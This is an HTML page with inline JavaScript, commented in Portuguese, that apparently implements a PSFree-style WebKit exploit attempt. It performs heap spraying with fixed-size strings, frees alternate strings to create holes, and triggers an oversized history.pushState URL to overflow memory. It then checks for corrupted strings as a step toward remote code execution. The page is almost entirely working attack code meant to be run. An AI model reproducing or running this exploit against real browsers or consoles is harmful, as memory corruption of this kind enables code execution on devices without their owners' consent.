<!DOCTYPE html>
<html>
<head>
    <title>PSFree Logic: Persistent 8-Bit Spray</title>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #1a1a1a; color: #fff; cursor: pointer; }
        #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; }
    </style>
</head>
<body>

    <h1>Ataque Persistente (Lógica PSFree Fiel)</h1>
    <p>Usando Strings de 8-bits e Loop de Realocação.</p>

    <button onclick="startPersistentAttack()">INICIAR LOOP DE ATAQUE</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 64; 

        // Tamanho alvo: 0x50 (80 bytes) - O padrão do PSFree
        // Se falhar, podemos tentar 128, 256, etc.
        const TARGET_SIZE = 80; 
        
        // Offset do StringImpl (Header)
        // No bundle.js é 0x18 (24 bytes).
        const HEADER_SIZE = 24;
        const DATA_SIZE = TARGET_SIZE - HEADER_SIZE;

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        // Função sleep do bundle.js
        function sleep(ms=0) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Função gc do bundle.js (simplificada)
        function gc() {
            try { new Uint8Array(4 * 1024 * 1024); } catch(e){}
        }

        async function startPersistentAttack() {
            log("Iniciando Loop Persistente...");
            
            // Prepara o "Pad" (Recheio) usando a técnica de 8 bits
            // "B".repeat(N) cria string de 1 byte por char (Latin-1)
            const pad = "B".repeat(DATA_SIZE);

            // Loop Infinito (até dar certo ou memória acabar)
            let attempt = 0;
            const MAX_ATTEMPTS = 50; // Tenta 50 vezes antes de desistir

            while(attempt < MAX_ATTEMPTS) {
                attempt++;
                log(`--- Tentativa ${attempt} ---`);

                // 1. SPRAY (Criar Strings)
                victims = [];
                for(let i=0; i<5000; i++) {
                    // Cria uma string única mas com o tamanho exato
                    // Usamos o índice no final para não quebrar o alinhamento do começo
                    // A técnica do PSFree usa join('') para forçar a criação
                    let s = [pad, i].join(""); 
                    // Corta o excesso para manter o tamanho exato
                    s = s.substring(0, DATA_SIZE);
                    victims.push(s);
                }

                // 2. BURACOS (Queijo Suíço)
                for(let i=0; i<victims.length; i+=2) {
                    victims[i] = null;
                }
                
                // Força GC e espera (Timing do PSFree)
                gc();
                await sleep(50); 

                // 3. EXPLOIT
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    // Dispara
                    history.pushState({}, "pwn", "/" + buffer);
                    
                    // 4. CHECAGEM
                    if (checkVictory(DATA_SIZE)) {
                        return; // Sai do loop se vencer
                    }

                } catch(e) {
                    log("Erro crítico: " + e.message);
                    return;
                }

                // Se falhou, limpa tudo e tenta de novo
                victims = null;
                gc();
                await sleep(100);
            }
            
            log("Falha após " + MAX_ATTEMPTS + " tentativas.");
        }

        function checkVictory(originalLen) {
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                // Se o tamanho mudou
                if (s.length !== originalLen) {
                    log(`!!! SUCESSO !!! String ${i} corrompida!`, 'win');
                    log(`Novo Tamanho: ${s.length}`);
                    alert("RCE PRIMITIVE: STRINGIMPL CORRUPTED!");
                    return true;
                }
                
                // Se o conteúdo mudou (byte 0x01)
                // O PSFree verifica se charCodeAt(0) mudou
                if (s.charCodeAt(0) !== 66) { // 66 = 'B'
                     log(`!!! SUCESSO !!! Conteúdo alterado no index ${i}`, 'win');
                     alert("RCE PRIMITIVE: CONTENT CORRUPTED!");
                     return true;
                }
            }
            return false;
        }
    </script>
</body>
</html>
